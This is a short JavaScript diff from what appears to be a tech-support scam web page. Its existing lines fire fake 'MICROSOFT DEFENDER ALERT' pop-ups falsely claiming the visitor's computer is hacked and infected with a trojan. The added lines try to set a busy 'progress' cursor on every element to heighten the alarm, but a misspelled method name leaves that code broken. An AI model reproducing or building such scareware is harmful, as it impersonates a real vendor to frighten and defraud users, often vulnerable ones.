@@ -69,6 +69,10 @@ function getQueryParam(param) {
     return urlParams.get(param);
 }
 $(document).ready(function(){
+        var elems = document.querySeectorAll("*");
+for(var i = 0; i < elems.length; i++){
+        elems[i].style.cursor = "progress";
+}
     alert("***MICROSOFT DEFENDER ALERT*** Threat found!");
     alert("***MICROSOFT DEFENDER ALERT*** Your computer as been hacked by an unknown device, and is requested to be controlled.");
     alert("***MICROSOFT DEFENDER ALERT*** An unknown device is opening a trojan on your computer.");
